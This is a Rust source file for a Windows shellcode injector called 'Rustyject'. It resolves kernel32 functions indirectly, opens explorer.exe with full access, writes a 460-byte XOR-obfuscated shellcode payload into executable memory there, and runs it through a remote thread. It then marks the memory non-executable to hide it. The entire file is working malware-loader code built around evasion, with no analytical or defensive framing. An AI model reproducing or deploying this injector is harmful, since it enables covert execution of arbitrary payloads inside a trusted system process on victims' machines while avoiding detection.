use std::ffi::CString;
use std::mem::size_of;
use std::ptr::null_mut;
use winapi::shared::minwindef::{DWORD, HMODULE, FARPROC};
use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
use winapi::um::winnt::{HANDLE, PROCESS_ALL_ACCESS, MEM_COMMIT, PAGE_EXECUTE_READWRITE, PAGE_READWRITE};
use winapi::um::tlhelp32::{CreateToolhelp32Snapshot, Process32First, Process32Next, TH32CS_SNAPPROCESS, PROCESSENTRY32};
const ALPHABET: &str = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
type FnOpenProcess = unsafe extern "system" fn(DWORD, i32, DWORD) -> HANDLE;
type FnVirtualAllocEx = unsafe extern "system" fn(HANDLE, *mut std::ffi::c_void, usize, DWORD, DWORD) -> *mut std::ffi::c_void;
type FnWriteProcessMemory = unsafe extern "system" fn(HANDLE, *mut std::ffi::c_void, *const std::ffi::c_void, usize, *mut usize) -> i32;
type FnCreateRemoteThread = unsafe extern "system" fn(HANDLE, *mut std::ffi::c_void, usize, unsafe extern "system" fn(*mut std::ffi::c_void) -> DWORD, *mut std::ffi::c_void, DWORD, *mut DWORD) -> HANDLE;
type FnVirtualProtectEx = unsafe extern "system" fn(HANDLE, *mut std::ffi::c_void, usize, DWORD, *mut DWORD) -> i32;
type FnCloseHandle = unsafe extern "system" fn(HANDLE) -> i32;
fn get_proc_address(module: HMODULE, func_name: &str) -> FARPROC {
    let func_name = CString::new(func_name).unwrap();
    unsafe { GetProcAddress(module, func_name.as_ptr()) }
}
fn main() {
    let kernel32 = unsafe { GetModuleHandleA(b"kernel32.dll\0".as_ptr() as *const i8) };
    println!("[INDIRECTION] Kernel32 module handle: {:?}", kernel32);
    let open_process: FnOpenProcess = unsafe { std::mem::transmute(get_proc_address(kernel32, "OpenProcess")) };
    let virtual_alloc_ex: FnVirtualAllocEx = unsafe { std::mem::transmute(get_proc_address(kernel32, "VirtualAllocEx")) };
    let write_process_memory: FnWriteProcessMemory = unsafe { std::mem::transmute(get_proc_address(kernel32, "WriteProcessMemory")) };
    let create_remote_thread: FnCreateRemoteThread = unsafe { std::mem::transmute(get_proc_address(kernel32, "CreateRemoteThread")) };
    let virtual_protect_ex: FnVirtualProtectEx = unsafe { std::mem::transmute(get_proc_address(kernel32, "VirtualProtectEx")) };
    let close_handle: FnCloseHandle = unsafe { std::mem::transmute(get_proc_address(kernel32, "CloseHandle")) };
    println!("[INDIRECTION] API function pointers resolved successfully.");
    let process_name = "explorer.exe";
    let pid = get_process_id(process_name).expect("Failed to get process ID");
    println!("[MAIN] Target process '{}' found with PID: {}", process_name, pid);
    let process_handle = unsafe { open_process(PROCESS_ALL_ACCESS, 0, pid) };
    println!("[MAIN] Opened handle {:?} to target process.", process_handle);
    let shellcode: [&str; 460] = [
"LEH", "AFM", "MBB", "ICf",
"IHw", "LMT", "IGF", "HFu",
"HAp", "HCr", "DJx", "BMM",
"CIi", "DOn", "ACP", "ABP",
"BOH", "AFM", "HDB", "LEf",
"BCw", "BMT", "MNF", "CHu",
"BAp", "DKr", "PDx", "BPM",
"HBi", "CGn", "NLP", "ACP",
"GIH", "AFM", "MJB", "BEf",
"CHw", "BMT", "EJF", "MCu",
"DKp", "DIr", "DFx", "HMM",
"KAi", "CGn", "GBP", "JAP",
"OEH", "HBM", "CDB", "BKf",
"HFw", "HIT", "GGF", "DEu",
"LBp", "LLr", "HFx", "AMM",
"GIi", "KPn", "LCP", "LNP",
"BKH", "AMM", "BDB", "COf",
"PMw", "AGT", "GGF", "POu",
"DCp", "EOr", "DAx", "EMM",
"LJi", "OFn", "NAP", "NIP",
"EIH", "ENM", "ECB", "COf",
"PCw", "JET", "DCF", "BCu",
"DIp", "HDr", "KIx", "BNM",
"OCi", "CGn", "EIP", "BEP",
"MDH", "ANM", "GCB", "CPf",
"HGw", "IET", "KFF", "CDu",
"DIp", "INr", "LBx", "AMM",
"OCi", "FKn", "NIP", "BIP",
"EJH", "JLM", "APB", "FHf",
"LOw", "BMT", "HHF", "LFu",
"NMp", "DDr", "LJx", "IEM",
"GEi", "CPn", "FBP", "JBP",
"HAH", "KNM", "DHB", "JHf",
"DLw", "FHT", "AKF", "FBu",
"HIp", "DHr", "EBx", "JMM",
"BMi", "LGn", "AIP", "BEP",
"MDH", "ANM", "GGB", "CPf",
"HGw", "IET", "CAF", "DEu",
"PLp", "HOr", "DAx", "AJM",
"OCi", "COn", "EMP", "BJP",
"EJH", "JNM", "ADB", "ONf",
"HDw", "NMT", "AOF", "HEu",
"KAp", "DDr", "CAx", "AMM",
"DBi", "DAn", "AJP", "AKP",
"AJH", "BFM", "ADB", "DPf",
"DGw", "AOT", "AOF", "PGu",
"JMp", "FCr", "DJx", "BPM",
"JGi", "IOn", "AIP", "BBP",
"BBH", "BHM", "AKB", "ONf",
"GFw", "LNT", "BBF", "IKu",
"IPp", "INr", "CFx", "AEM",
"NHi", "BJn", "CDP", "GCP",
"BHH", "HOM", "HAB", "GGf",
"HHw", "BFT", "BAF", "DMu",
"PJp", "JEr", "DAx", "MMM",
"IFi", "MOn", "FBP", "FAP",
"EIH", "AEM", "MLB", "IDf",
"DOw", "OIT", "EEF", "HFu",
"GGp", "GKr", "AHx", "ENM",
"GJi", "GPn", "BBP", "AEP",
"ABH", "MEM", "KGB", "CKf",
"POw", "KFT", "AHF", "MPu",
"DMp", "AFr", "FOx", "EKM",
"JGi", "LLn", "BMP", "NJP",
"KCH", "CFM", "EDB", "GHf",
"HHw", "FET", "BPF", "DEu",
"MKp", "FLr", "PIx", "CGM",
"GJi", "JBn", "IFP", "AAP",
"BIH", "AAM", "HDB", "KPf",
"DKw", "GFT", "IGF", "DNu",
"IPp", "LCr", "DAx", "MEM",
"KLi", "CGn", "KPP", "JAP",
"AAH", "MEM", "IDB", "CHf",
"MNw", "LOT", "EJF", "KKu",
"JAp", "INr", "KNx", "AFM",
"OAi", "KJn", "DKP", "EAP",
"AJH", "BFM", "AOB", "OPf",
"JFw", "BMT", "MPF", "IMu",
"DBp", "MIr", "OBx", "OIM",
"BNi", "APn", "KPP", "IFP",
"AAH", "MMM", "IGB", "CGf",
"HFw", "FET", "EGF", "DMu",
"MIp", "BBr", "BFx", "CJM",
"GJi", "GOn", "FAP", "FAP",
"EIH", "AMM", "BCB", "CHf",
"CHw", "BMT", "MPF", "JHu",
"CHp", "CFr", "CPx", "AAM",
"FIi", "KOn", "DKP", "FNP",
"BBH", "AMM", "BCB", "IEf",
"ILw", "DCT", "IBF", "DBu",
"FEp", "CGr", "HJx", "EMM",
"CBi", "ODn", "BEP", "HEP",
"FAH", "ILM", "ECB", "AOf",
"DPw", "NNT", "KAF", "CDu",
"CAp", "DDr", "CIx", "AMM",
"DJi", "CPn", "AAP", "BJP",
"LHH", "INM", "ADB", "DGf",
"DOw", "KLT", "IOF", "DIu",
"PJp", "LDr", "DEx", "MEM",
"KIi", "CPn", "OKP", "CJP",
"IEH", "HCM", "MEB", "JJf",
"KCw", "BMT", "HHF", "KHu",
"DIp", "INr", "LCx", "MGM",
"GHi", "CPn", "OKP", "FIP",
"MPH", "FAM", "CCB", "JJf",
"KCw", "OPT", "LGF", "MAu",
"NCp", "CEr", "DJx", "PHM",
"MPi", "PLn", "ONP", "MNP",
"LHH", "JIM", "AKB", "OFf",
"LDw", "HMT", "HKF", "HDu",
"AMp", "HIr", "PIx", "LGM",
"IJi", "BLn", "FFP", "OLP",
"APH", "FOM", "DAB", "AJf",
"BNw", "FET", "BPF", "DEu",
"PJp", "KIr", "IHx", "JIM"];
    println!("[MAIN] Encoded shellcode loaded || Total length: {} bytes", shellcode.len());
    let decoded_shellcode_len = shellcode.len();
    let remote_mem = unsafe {
        virtual_alloc_ex(process_handle, null_mut(), decoded_shellcode_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    };
    println!("[MEMORY] Memory allocated in target at address: {:?}", remote_mem);
    if remote_mem.is_null() {
        eprintln!("[MEMORY] Failed to allocate memory in remote process");
        unsafe { close_handle(process_handle); }
        return;
    }
    println!("[MEMORY] Shellcode decode/write operation initiated.");
    for (i, encoded_value) in shellcode.iter().enumerate() {
        if encoded_value.len() == 3 {
            let encoded_chars = &encoded_value[0..2];
            let key_char = encoded_value.chars().nth(2).unwrap();
            let xored_byte = (ALPHABET.find(encoded_chars.chars().nth(0).unwrap()).unwrap() << 4) |
                             ALPHABET.find(encoded_chars.chars().nth(1).unwrap()).unwrap();
            let decoded_byte = (xored_byte as u8) ^ (key_char as u8);
            let mut written = 0;
            let write_result = unsafe {
                write_process_memory(process_handle, (remote_mem as usize + i) as *mut _, &decoded_byte as *const u8 as *const _, 1, &mut written)
            };
            if write_result == 0 || written != 1 {
                eprintln!("[DECODE] Failed to write decoded byte to remote process at index {}", i);
                unsafe { close_handle(process_handle); }
                return;
            }
        } else {
            eprintln!("[DECODE] Invalid encoded value at index {}: {}", i, encoded_value);
            unsafe { close_handle(process_handle); }
            return;
        }
    }
    println!("[MEMORY] Shellcode fully written to memory.");
    println!("[MAIN] Remote thread initialization.");
    let remote_thread = unsafe {
        create_remote_thread(process_handle, null_mut(), 0, std::mem::transmute(remote_mem), null_mut(), 0, null_mut())
    };
    if remote_thread.is_null() {
        eprintln!("Failed to create remote thread in remote process");
        unsafe { close_handle(process_handle); }
        return;
    }
    println!("[EXECUTE] Success. Thread handle: {:?}", remote_thread);
    std::thread::sleep(std::time::Duration::from_millis(100));
    let mut old_protection = 0;
    let protect_result = unsafe {
        virtual_protect_ex(process_handle, remote_mem, decoded_shellcode_len, PAGE_READWRITE, &mut old_protection)
    };
    if protect_result == 0 {
        eprintln!("[GARGOYLE] Failed to change memory protection to non-executable");
    } else {
        println!("[GARGOYLE] Memory protection changed to [non-executable] || Old protection: {:#x}", old_protection);
    }
    unsafe {
        println!("[MAIN] Closing remote thread handle: {:?}", close_handle(remote_thread));
        println!("[MAIN] Closing process handle: {:?}", close_handle(process_handle));
    }
    println!("[MAIN] Rustyject routine successfully completed.");
}
fn get_process_id(process_name: &str) -> Option<DWORD> {
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snapshot == winapi::um::handleapi::INVALID_HANDLE_VALUE {
            return None;
        }
        let mut entry: PROCESSENTRY32 = std::mem::zeroed();
        entry.dwSize = size_of::<PROCESSENTRY32>() as u32;
        if Process32First(snapshot, &mut entry) == 0 {
            println!("Failed to get first process in snapshot");
            return None;
        }
        loop {
            let exe_name = std::ffi::CStr::from_ptr(entry.szExeFile.as_ptr());
            if exe_name.to_str().unwrap() == process_name {
                return Some(entry.th32ProcessID);
            }
            if Process32Next(snapshot, &mut entry) == 0 { break; }
        }
        println!("Process not found: {}", process_name);
    }
    None
}